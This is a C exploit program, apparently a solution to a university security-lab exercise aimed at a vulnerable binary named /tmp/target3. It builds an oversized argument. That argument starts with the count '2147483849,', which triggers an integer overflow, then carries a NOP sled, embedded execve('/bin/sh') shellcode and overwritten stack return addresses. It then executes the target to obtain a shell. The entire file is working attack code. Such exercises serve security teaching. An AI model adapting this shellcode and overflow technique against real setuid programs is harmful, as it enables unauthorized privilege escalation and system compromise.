#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define SIZE 200
#define widget 16

int main(void)
{
  char *args[3];
  char *env[1];

  /* version 1 */
  char buf[(SIZE+1)*widget+11+1];
  buf[(SIZE+1)*widget+11] = '\0';
  memset(buf, '\x90', (SIZE+1)*widget);
  strncpy(buf, "2147483849,", 11);
  strncpy(buf+11+3155,   
          "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
          "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
          "\x80\xe8\xdc\xff\xff\xff/bin/sh", 
          45);
  strncpy(buf+11+3200, "\xe8\xcc\xff\xbf\x4a\xe5\xff\xbf", 8);
  args[1] = buf; 

  args[0] = TARGET; 
  
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
